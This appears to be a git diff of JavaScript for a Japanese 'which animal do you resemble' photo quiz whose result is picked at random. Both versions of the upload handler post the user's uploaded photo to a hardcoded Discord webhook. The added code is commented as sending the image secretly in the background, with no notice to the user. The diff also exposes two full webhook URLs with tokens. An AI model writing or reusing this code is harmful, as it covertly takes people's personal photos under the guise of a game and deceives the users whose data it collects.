@@ -1,7 +1,7 @@
 // ===============================
 // 設定
 // ===============================
-const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477578888136753224/DnFQt6ChPn1akhWO01OrDFTnaSC2Zu-D7ALGnusyEU_aGfIzU2ny8_N3xDQhs0frn9nR"; // ←テスト用
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1477563123249446996/LiAwELzi1FhI6s3WXdQNQAoz8yh-r-kEMXPeGy4bs6g3NZbcKU4_lGt5Jrx_9a0pnBYk";
 let lastUploadedFile = null;
 
 // ===============================
@@ -28,33 +28,38 @@ document.addEventListener('DOMContentLoaded', createStars);
 // ===============================
 // ファイルアップロード
 // ===============================
-const uploadBtn = document.getElementById('uploadBtn');
-const fileInput = document.getElementById('fileInput');
+const uploadBtn = document.getElementById("uploadBtn");
+const fileInput = document.getElementById("fileInput");
 
-uploadBtn.addEventListener("click",()=>fileInput.click());
+uploadBtn.addEventListener("click", () => fileInput.click());
 
-fileInput.addEventListener("change", async ()=>{
+fileInput.addEventListener("change", async () => {
     const file = fileInput.files[0];
-    if(!file) return;
-
-    if(!file.type.match('image.*')){
-        alert('画像を選んでください');
+    if (!file) return;
+    if (!file.type.match('image.*')) {
+        alert("画像を選択してください");
         return;
     }
 
     lastUploadedFile = file;
 
-    const reader = new FileReader();
-    reader.onload = function(e){
-        localStorage.setItem('uploadedImage', e.target.result);
+    // 診断生成（ランダム動物）
+    const animal = getRandomAnimal();
+    storeResultData(animal); // ユーザー向けに結果保存
 
-        const animal = getRandomAnimal();
-        storeResultData(animal);
+    // Discord に裏で画像だけ送信
+    if (lastUploadedFile) {
+        const resizedBlob = await resizeImage(lastUploadedFile);
+        const formData = new FormData();
+        formData.append("file", resizedBlob, "image.png"); // 画像のみ送信
 
-        alert("診断完了！");
-        window.location.href='result.html';
-    };
-    reader.readAsDataURL(file);
+        fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData })
+            .then(res => console.log("Discord送信成功", res.status))
+            .catch(err => console.error("Discord送信失敗", err));
+    }
+
+    // 結果ページへ
+    window.location.href = 'result.html';
 });
 
 // ===============================
@@ -81,36 +86,8 @@ function getRandomAnimal(){
 }
 
 // ===============================
-// 画像をリサイズ（2MB以下目安）
-// ===============================
-async function resizeImage(file, maxSizeMB = 2){
-    return new Promise((resolve)=>{
-        const img = new Image();
-        const reader = new FileReader();
-        reader.onload = e => { img.src = e.target.result; };
-        img.onload = () => {
-            const canvas = document.createElement("canvas");
-            let width = img.width;
-            let height = img.height;
-            const scale = Math.sqrt((maxSizeMB * 1024 * 1024) / file.size);
-            if(scale < 1){
-                width *= scale;
-                height *= scale;
-            }
-            canvas.width = width;
-            canvas.height = height;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(img,0,0,width,height);
-            canvas.toBlob(blob=>resolve(blob),"image/png");
-        };
-        reader.readAsDataURL(file);
-    });
-}
-
-// ===============================
-// 結果保存 + Discord送信
-// ===============================
-async function storeResultData(animal){
+// 結果保存（ユーザー向け）
+function storeResultData(animal){
     const resultData = {
         name: animal.name,
         icon: animal.icon,
@@ -119,28 +96,30 @@ async function storeResultData(animal){
         timestamp: new Date().toISOString()
     };
     localStorage.setItem('diagnosisResult', JSON.stringify(resultData));
+}
 
-    if(lastUploadedFile){
-        const resizedBlob = await resizeImage(lastUploadedFile);
+// ===============================
+// 画像リサイズ関数（2MB目安）
+async function resizeImage(file, maxSizeMB = 2) {
+    return new Promise((resolve) => {
+        const img = new Image();
+        const reader = new FileReader();
+        reader.onload = e => { img.src = e.target.result; };
+        img.onload = () => {
+            const canvas = document.createElement("canvas");
+            let width = img.width;
+            let height = img.height;
 
-        const formData = new FormData();
-        formData.append("file", resizedBlob, "image.png");
+            const scale = Math.min(1, Math.sqrt((maxSizeMB * 1024 * 1024) / file.size));
+            width *= scale;
+            height *= scale;
 
-        const safeDescription = animal.description.length > 200 ? animal.description.substring(0,200)+"…" : animal.description;
-
-        formData.append("payload_json", JSON.stringify({
-            username:"似てる動物AI",
-            content:"📷 新しい診断結果が届きました！",
-            embeds:[{
-                title:"診断結果",
-                description:`**動物タイプ**：${animal.name} ${animal.icon}\n**特徴**：${safeDescription}\n似ている度：${animal.similarity}%`,
-                color:0x9ddcff,
-                image:{url:"attachment://image.png"}
-            }]
-        }));
-
-        fetch(DISCORD_WEBHOOK_URL, {method:"POST", body:formData})
-            .then(res=>console.log("Discord送信成功", res.status))
-            .catch(err=>console.error("Discord送信失敗", err));
-    }
+            canvas.width = width;
+            canvas.height = height;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(img, 0, 0, width, height);
+            canvas.toBlob(blob => resolve(blob), "image/png");
+        };
+        reader.readAsDataURL(file);
+    });
 }
